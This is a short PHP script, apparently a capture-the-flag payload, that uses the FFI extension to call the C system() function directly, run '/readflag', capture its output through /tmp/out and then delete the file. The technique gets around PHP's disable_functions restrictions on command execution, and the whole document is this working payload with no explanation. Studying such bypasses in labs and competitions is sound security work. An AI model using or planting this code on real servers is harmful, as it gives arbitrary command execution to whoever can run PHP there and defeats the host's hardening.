<?php
$cmd="/readflag";
$ffi=FFI::cdef("int system(const char *command);");
$ffi->system("$cmd > /tmp/out");
echo file_get_contents("/tmp/out");
@unlink("/tmp/out");
?>
